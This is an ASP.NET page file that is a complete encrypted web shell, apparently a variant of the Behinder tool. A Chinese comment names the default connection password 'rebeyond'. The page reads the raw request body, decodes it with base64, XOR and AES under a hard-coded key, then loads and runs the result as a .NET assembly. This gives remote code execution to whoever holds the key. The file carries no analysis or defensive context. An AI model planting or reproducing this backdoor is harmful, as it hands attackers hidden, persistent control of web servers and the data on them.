<%@ Page Language="C#" %>
<%@Import Namespace="System.Reflection"%>
<%Session.Add("k","e45e329feb5d925b"); /*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/
byte[] k = Encoding.Default.GetBytes(Session[0] + "");
String tmp=Encoding.Default.GetString(Request.BinaryRead(Request.ContentLength));
String f=Encoding.Default.GetString(k).Substring(0, 1);
tmp=tmp.Replace("#", Encoding.Default.GetString(k).Substring(0, 1).ToLower()).Replace("*","=");
byte[] data = Convert.FromBase64String(tmp);
for (int i = 0; i < data.Length; i++){data[i] ^= k[i +1&15];}
Assembly.Load(new System.Security.Cryptography.RijndaelManaged().CreateDecryptor(k, k).TransformFinalBlock(data, 0, data.Length)).CreateInstance("U").Equals(this);
%>